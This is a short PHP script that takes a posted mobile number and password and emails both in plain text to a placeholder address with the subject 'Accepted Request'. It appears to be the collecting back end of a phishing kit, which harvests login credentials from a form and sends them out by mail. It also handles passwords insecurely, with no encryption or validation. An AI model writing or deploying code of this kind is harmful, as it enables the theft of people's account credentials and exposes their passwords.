<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $id = $_POST['id'];
    $mobile = $_POST['mobile'];
    $password = $_POST['password'];
    
    // Email details
    $to = 'recipient@example.com';
    $subject = 'Accepted Request';
    $message = 'Mobile: ' . $mobile . "\r\n" . 'Password: ' . $password;

    // Send email
    if (mail($to, $subject, $message)) {
        echo "Email sent successfully";
    } else {
        echo "Failed to send email";
    }
}
?>
